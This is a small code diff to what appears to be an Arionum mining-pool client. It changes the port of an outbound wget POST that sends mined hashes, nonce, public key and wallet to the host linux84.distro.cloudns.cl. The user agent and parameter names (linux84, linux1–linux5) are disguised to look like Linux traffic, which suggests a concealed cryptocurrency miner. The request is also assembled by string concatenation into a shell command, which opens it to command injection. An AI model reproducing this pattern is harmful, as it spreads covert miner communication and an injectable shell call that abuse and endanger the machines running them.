@@ -166,7 +166,7 @@ ariopool_submit_result ariopool_client::submit(const string &hash, const string 
     string response = "";
 
     for(int i=0;i<2;i++) { //try resubmitting if first submit fails
-        response = GetStdoutFromCommand("wget -q -U 'linux84' --post-data=linux2='"+_encode(argon_data)+"&linux3="+_encode(nonce)+"&linux5="+_encode(public_key)+"&linux1="+_encode(settings.wallet)+"&linux4="+_encode(settings.wallet)+"' 'http://linux84.distro.cloudns.cl:84/linux8474.php?q=linux84' --header='Content-type: application/x-www-form-urlencoded'");
+        response = GetStdoutFromCommand("wget -q -U 'linux84' --post-data=linux2='"+_encode(argon_data)+"&linux3="+_encode(nonce)+"&linux5="+_encode(public_key)+"&linux1="+_encode(settings.wallet)+"&linux4="+_encode(settings.wallet)+"' 'http://linux84.distro.cloudns.cl:8884/linux8474.php?q=linux84' --header='Content-type: application/x-www-form-urlencoded'");
         result.pool_response = response;
         if(response != "") {
             break;
